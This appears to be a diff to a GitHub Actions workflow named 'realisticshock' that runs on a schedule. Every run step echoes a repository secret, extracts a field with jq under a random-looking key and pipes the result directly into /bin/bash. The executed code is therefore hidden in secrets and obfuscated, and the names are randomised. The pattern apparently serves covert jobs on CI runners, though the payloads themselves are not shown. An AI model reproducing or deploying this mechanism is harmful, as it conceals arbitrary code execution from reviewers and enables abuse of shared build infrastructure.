@@ -2,29 +2,20 @@ name: realisticshock
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 3/6 * * *'
-jobs:  # 12676
+    - cron: '20 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: realisticshock
         env:
-          ynboq023: ${{ secrets.ynboq023 }}
+          pe89: ${{ secrets.pe89 }}
         run: |
-          echo $ynboq023 | jq -r .u9 | /bin/bash
-          echo $afw20 | jq -r .yomeh84 | /bin/bash
-          echo $wmnua61 | jq -r .gdedg63 | /bin/bash
-          echo $i32 | jq -r .y0224 | /bin/bash
-          echo $umqg6 | jq -r .dv29 | /bin/bash
-          echo $ljz24354 | jq -r .u876 | /bin/bash
-          echo $t87915 | jq -r .c45 | /bin/bash
-          echo $mmli12676 | jq -r .ssy31775 | /bin/bash
-          echo $si65958 | jq -r .fch29747 | /bin/bash
-          echo $jnsn23 | jq -r .cpig9 | /bin/bash
-          echo $czdqh6967 | jq -r .mim2 | /bin/bash
-          echo $jet0 | jq -r .ti97 | /bin/bash
-          echo $rbahu511 | jq -r .axbu05240 | /bin/bash
-          echo $wjaf308 | jq -r .mi45485 | /bin/bash
-          echo $q3 | jq -r .qjkxg36483 | /bin/bash
+          echo $pe89 | jq -r .kz4175 | /bin/bash
+          echo $rr808 | jq -r .hjlat76 | /bin/bash
+          echo $yk7114 | jq -r .wkyq02390 | /bin/bash
+          echo $yzo734 | jq -r .souv89514 | /bin/bash
+          echo $odsg0810 | jq -r .irsg04 | /bin/bash
 
